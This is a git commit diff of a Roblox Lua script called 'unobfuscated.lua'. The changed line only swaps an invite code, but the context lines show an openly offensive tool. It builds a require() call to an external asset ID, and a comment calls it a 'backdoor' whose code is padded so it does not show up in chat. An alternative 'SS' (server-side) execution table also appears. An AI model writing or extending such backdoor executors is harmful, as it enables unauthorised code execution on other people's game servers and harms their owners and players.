82a95b71c0519997fefc36d8400b7334c640c977
wowowowowowowowowowowowowowoowowowoowow <139587056+wowowowowowowowowowowowowowoowowowoowow@users.noreply.github.com>
2023-09-05 07:34:57 +0200

    unobfuscated.lua

--- unobfuscated.lua
+++ unobfuscated.lua
@@ -12,7 +12,7 @@ local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local requireScript = ("require(14683517992).rc('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
-local invCode = "w8SkzPz9qQ"
+local invCode = "v5YksgwtaR"
 
 local alternativeSS = {
 	run = { [1] = "5#lGIERKWEF" },
